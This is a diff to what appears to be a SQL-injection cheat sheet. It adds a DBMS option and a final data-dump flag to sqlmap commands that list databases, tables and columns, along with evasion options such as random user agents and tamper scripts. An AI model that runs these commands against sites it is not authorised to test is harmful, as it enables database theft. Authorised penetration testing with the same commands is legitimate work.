@@ -4,12 +4,12 @@
 
 sqlmap -u 'Website' --dbs
 
-sqlmap -u 'Website' -D name.db --tables
+sqlmap -u 'Website' --dbms='BaseName' -D name.db --tables
 
-sqlmap -u 'Website' -D name.db -T name.tables --columns
+sqlmap -u 'Website' --dbms='BaseName' -D name.db -T name.tables --columns
 
-sqlmap -u 'Website' -D name.db -T name.tables -C name.columns
+sqlmap -u 'Website' --dbms='BaseName' -D name.db -T name.tables -C name.columns
 
-Default CMD | --random-agent --level=5 --risk=3 --tamper=space2comment --anwser="follow" --batch --threads=10 --beep
+Default CMD | --random-agent --level=5 --risk=3 --tamper=space2comment --anwser="follow" --batch --threads=10 --beep --dump
 
 <p align="center"><img src="https://img.shields.io/badge/SQL-Injection-critical"></p>
